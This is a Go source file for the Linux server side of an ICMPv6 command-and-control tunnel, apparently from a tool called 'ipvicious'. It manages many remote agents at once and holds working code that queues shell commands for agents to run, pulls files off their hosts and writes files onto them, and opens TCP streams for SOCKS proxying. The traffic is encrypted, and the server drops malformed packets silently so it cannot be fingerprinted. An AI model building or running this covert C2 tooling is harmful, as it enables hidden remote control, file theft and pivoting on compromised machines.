//go:build linux

// Package tunnel – server side (Linux C2).
//
// ServerTunnel listens on a raw ICMPv6 socket and multiplexes multiple
// independent agent connections. Each agent is tracked as an *AgentEntry
// keyed by its IPv6 source address. All per-agent state (send queue, stream
// table, session info) lives in AgentEntry so that each agent can be targeted
// independently by the operator.
package tunnel

import (
	"crypto/cipher"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"ipvicious/internal/icmpv6"
	"ipvicious/internal/protocol"
)

// AgentSession holds timing and connection state for one agent.
type AgentSession struct {
	Addr        net.Addr
	LastPoll    time.Time // time of the most recent poll received
	NextPoll    time.Time // expected next poll (LastPoll + AgentPollMs)
	AgentPollMs uint32    // last poll interval sent to the agent (0 = unknown)
}

// AgentEntry is the server-side representation of one connected agent.
// Each agent has its own send queue, stream table, and session state so that
// multiple agents can be targeted independently without interference.
type AgentEntry struct {
	// Key is "<ipv6_addr>#<echoID>" — unique per agent.exe process even when
	// multiple processes run on the same host (same IPv6 address).
	// Immutable after creation.
	Key string
	// EchoID is the ICMP echo identifier assigned by the OS to the agent's
	// Icmp6CreateFile handle.  It is unique per process on the same host.
	EchoID int

	mu        sync.RWMutex
	session   AgentSession
	streams   *StreamTable
	sendQueue chan *protocol.Frame
	seqCtr    uint32
}

func newAgentEntry(key string, addr net.Addr, echoID int) *AgentEntry {
	return &AgentEntry{
		Key:       key,
		EchoID:    echoID,
		streams:   NewStreamTable(),
		sendQueue: make(chan *protocol.Frame, 256),
		session: AgentSession{
			Addr:     addr,
			LastPoll: time.Now(),
		},
	}
}

// Session returns a snapshot of the agent's session state.
func (e *AgentEntry) Session() AgentSession {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.session
}

// Streams returns the agent's stream table (used by the SOCKS5 layer).
func (e *AgentEntry) Streams() *StreamTable { return e.streams }

// Enqueue adds a frame to this agent's outbound send queue.
// If the queue is full the oldest frame is discarded (ring-buffer behaviour).
func (e *AgentEntry) Enqueue(f *protocol.Frame) {
	select {
	case e.sendQueue <- f:
	default:
		select {
		case <-e.sendQueue:
		default:
		}
		e.sendQueue <- f
	}
}

func (e *AgentEntry) nextSeq() uint32 { return atomic.AddUint32(&e.seqCtr, 1) }

func (e *AgentEntry) enqueueCtrl(typ byte, streamID uint32, data []byte) {
	e.Enqueue(&protocol.Frame{Type: typ, StreamID: streamID, SeqNo: e.nextSeq(), Data: data})
}

// SendCmd sends a shell command to this agent for execution.
func (e *AgentEntry) SendCmd(cmd string) {
	e.enqueueCtrl(protocol.TypeCmd, StreamCmd, []byte(cmd))
}

// SendFileGet requests the agent to upload a file to the C2.
func (e *AgentEntry) SendFileGet(remotePath string) {
	e.enqueueCtrl(protocol.TypeFileGet, StreamFile, []byte(remotePath))
}

// SendFilePut instructs the agent to create/overwrite a file.
// Follow with SendFileData calls, then SendFileEnd.
func (e *AgentEntry) SendFilePut(path string, firstChunk []byte) {
	e.Enqueue(&protocol.Frame{
		Type:     protocol.TypeFilePut,
		StreamID: StreamFile,
		SeqNo:    e.nextSeq(),
		Data:     protocol.EncodeFilePut(path, firstChunk),
	})
}

// SendFileData sends a subsequent chunk for an in-progress file upload (put).
func (e *AgentEntry) SendFileData(chunk []byte) {
	e.enqueueCtrl(protocol.TypeFileData, StreamFile, chunk)
}

// SendFileEnd finalises an in-progress file upload on the agent side.
func (e *AgentEntry) SendFileEnd() {
	e.enqueueCtrl(protocol.TypeFileEnd, StreamFile, nil)
}

// SetPollInterval instructs the agent to change its ICMPv6 polling interval.
func (e *AgentEntry) SetPollInterval(pollMs uint32) {
	if pollMs < 10 {
		pollMs = 10
	}
	e.mu.Lock()
	e.session.AgentPollMs = pollMs
	e.mu.Unlock()
	e.enqueueCtrl(protocol.TypeSetPoll, StreamControl, protocol.EncodeSetPoll(pollMs))
}

// OpenStream instructs the agent to open a TCP connection to addrType/addr/port.
func (e *AgentEntry) OpenStream(streamID uint32, addrType byte, addr []byte, port uint16) {
	e.Enqueue(&protocol.Frame{
		Type:     protocol.TypeStreamOpen,
		StreamID: streamID,
		SeqNo:    e.nextSeq(),
		Data:     protocol.EncodeStreamOpen(addrType, addr, port),
	})
}

// CloseStream sends TypeStreamClose to the agent and removes the stream.
func (e *AgentEntry) CloseStream(streamID uint32) {
	if s := e.streams.Get(streamID); s != nil {
		s.Close()
		e.streams.Remove(streamID)
	}
	e.enqueueCtrl(protocol.TypeStreamClose, streamID, nil)
}

func (e *AgentEntry) updateSession(addr net.Addr) {
	e.mu.Lock()
	e.session.Addr = addr
	e.session.LastPoll = time.Now()
	if e.session.AgentPollMs > 0 {
		e.session.NextPoll = e.session.LastPoll.Add(
			time.Duration(e.session.AgentPollMs) * time.Millisecond)
	}
	e.mu.Unlock()
}

// ─── ServerTunnel ─────────────────────────────────────────────────────────────

// ServerTunnel manages the C2-side of the ICMPv6 tunnel.
// It supports multiple concurrent agents; each is tracked as an *AgentEntry
// identified by the agent's IPv6 source address string.
type ServerTunnel struct {
	listener *icmpv6.Listener
	aead     cipher.AEAD
	seqCtr   uint32 // used only for noops (shared)

	agentsMu sync.RWMutex
	agents   map[string]*AgentEntry

	// Callbacks invoked from the ICMPv6 receive goroutine.
	// agentKey is the string form of the agent's IPv6 source address.
	OnHello    func(agentKey string, addr net.Addr)
	OnCmdOut   func(agentKey string, streamID uint32, seqNo uint32, data []byte)
	OnFileData func(agentKey string, streamID uint32, seqNo uint32, data []byte, last bool)
	OnData     func(agentKey string, streamID uint32, data []byte)
}

// NewServerTunnel creates a ServerTunnel with a raw ICMPv6 listener.
func NewServerTunnel() (*ServerTunnel, error) {
	l, err := icmpv6.NewListener()
	if err != nil {
		return nil, fmt.Errorf("create icmpv6 listener: %w", err)
	}
	return &ServerTunnel{
		listener: l,
		agents:   make(map[string]*AgentEntry),
	}, nil
}

// Close shuts down the listener.
func (t *ServerTunnel) Close() { t.listener.Close() }

// SetPSK configures AES-256-GCM authenticated encryption for all tunnel frames.
// Must be called before Run. An empty psk disables encryption.
func (t *ServerTunnel) SetPSK(psk string) error {
	if psk == "" {
		t.aead = nil
		return nil
	}
	aead, err := protocol.NewAEAD(psk)
	if err != nil {
		return fmt.Errorf("tunnel SetPSK: %w", err)
	}
	t.aead = aead
	return nil
}

// Agent returns the AgentEntry for the given key, or nil if not known.
func (t *ServerTunnel) Agent(key string) *AgentEntry {
	t.agentsMu.RLock()
	defer t.agentsMu.RUnlock()
	return t.agents[key]
}

// Agents returns a snapshot of all known AgentEntry values.
func (t *ServerTunnel) Agents() []*AgentEntry {
	t.agentsMu.RLock()
	defer t.agentsMu.RUnlock()
	out := make([]*AgentEntry, 0, len(t.agents))
	for _, e := range t.agents {
		out = append(out, e)
	}
	return out
}

// Run starts the ICMPv6 receive loop. Blocks until stop is closed.
func (t *ServerTunnel) Run(stop <-chan struct{}) {
	reqCh := make(chan *icmpv6.Request, 8)
	go func() {
		for {
			req, err := t.listener.Read()
			if err != nil {
				select {
				case <-stop:
					return
				default:
					log.Printf("[tunnel] read error: %v", err)
					continue
				}
			}
			select {
			case reqCh <- req:
			case <-stop:
				return
			}
		}
	}()
	for {
		select {
		case <-stop:
			return
		case req := <-reqCh:
			t.handleRequest(req)
		}
	}
}

// findOrCreate returns the existing AgentEntry for (addr, echoID), or creates a new one.
// The key is computed as "addr#echoID" so that two agent.exe processes on the same
// host (same IPv6 address but different ICMP echo IDs) get independent entries.
func (t *ServerTunnel) findOrCreate(from net.Addr, echoID int) (entry *AgentEntry, isNew bool) {
	key := fmt.Sprintf("%s#%d", from.String(), echoID)
	t.agentsMu.RLock()
	entry = t.agents[key]
	t.agentsMu.RUnlock()
	if entry != nil {
		return entry, false
	}
	t.agentsMu.Lock()
	if entry = t.agents[key]; entry == nil {
		entry = newAgentEntry(key, from, echoID)
		t.agents[key] = entry
		isNew = true
	}
	t.agentsMu.Unlock()
	return entry, isNew
}

// handleRequest processes one ICMPv6 echo request and sends the reply.
func (t *ServerTunnel) handleRequest(req *icmpv6.Request) {
	// Drop silently on bad magic or decrypt failure — replying would fingerprint the server.
	in, err := protocol.Decode(req.Payload, t.aead)
	if err != nil {
		if err != protocol.ErrBadMagic && err != protocol.ErrDecryptFailed {
			t.sendNoop(req)
		}
		return
	}

	entry, isNew := t.findOrCreate(req.From, req.ID)
	entry.updateSession(req.From)
	if isNew {
		log.Printf("[tunnel] new agent: %s", entry.Key)
		// Fire OnHello for every new entry regardless of the first frame type.
		// This handles the server-restart case: agents that were already running
		// will send TypeNoop (not TypeHello) to the new server, but the operator
		// still needs to see them appear in the REPL.
		if t.OnHello != nil {
			go t.OnHello(entry.Key, req.From)
		}
	}

	switch in.Type {
	case protocol.TypeHello:
		log.Printf("[tunnel] hello from %s", entry.Key)
		// Fire OnHello again only for known agents that re-send Hello (e.g.
		// agent restart with same echoID). Skip if already fired above (isNew).
		if !isNew && t.OnHello != nil {
			go t.OnHello(entry.Key, req.From)
		}

	case protocol.TypeData:
		if s := entry.streams.Get(in.StreamID); s != nil && !s.IsClosed() {
			select {
			case s.RecvBuf <- in.Data:
			default:
				log.Printf("[tunnel] %s stream %d recv buffer full, dropping %d bytes",
					entry.Key, in.StreamID, len(in.Data))
			}
		}
		if t.OnData != nil {
			go t.OnData(entry.Key, in.StreamID, in.Data)
		}

	case protocol.TypeStreamClose:
		if s := entry.streams.Get(in.StreamID); s != nil {
			s.Close()
			entry.streams.Remove(in.StreamID)
		}

	case protocol.TypeCmdOut, protocol.TypeAck:
		if t.OnCmdOut != nil {
			go t.OnCmdOut(entry.Key, in.StreamID, in.SeqNo, in.Data)
		}

	case protocol.TypeFileData:
		if t.OnFileData != nil {
			go t.OnFileData(entry.Key, in.StreamID, in.SeqNo, in.Data, false)
		}

	case protocol.TypeFileEnd:
		if t.OnFileData != nil {
			go t.OnFileData(entry.Key, in.StreamID, in.SeqNo, nil, true)
		}

	case protocol.TypeError:
		log.Printf("[tunnel] %s error (stream %d): %s", entry.Key, in.StreamID, string(in.Data))

	case protocol.TypeNoop:
		// nothing to process
	}

	// Pick the next queued outbound frame for this agent (or send a Noop).
	var out *protocol.Frame
	select {
	case out = <-entry.sendQueue:
	default:
		out = &protocol.Frame{Type: protocol.TypeNoop, SeqNo: atomic.AddUint32(&t.seqCtr, 1)}
	}

	replyPayload, err := protocol.Encode(out, t.aead)
	if err != nil {
		log.Printf("[tunnel] encode reply error: %v", err)
		t.sendNoop(req)
		return
	}
	if err := t.listener.Reply(req, replyPayload); err != nil {
		log.Printf("[tunnel] reply error: %v", err)
	}
}

// sendNoop sends a TypeNoop reply for malformed (non-magic) frames.
func (t *ServerTunnel) sendNoop(req *icmpv6.Request) {
	noop := &protocol.Frame{Type: protocol.TypeNoop, SeqNo: atomic.AddUint32(&t.seqCtr, 1)}
	replyPayload, _ := protocol.Encode(noop, t.aead)
	if err := t.listener.Reply(req, replyPayload); err != nil {
		log.Printf("[tunnel] noop reply error: %v", err)
	}
}
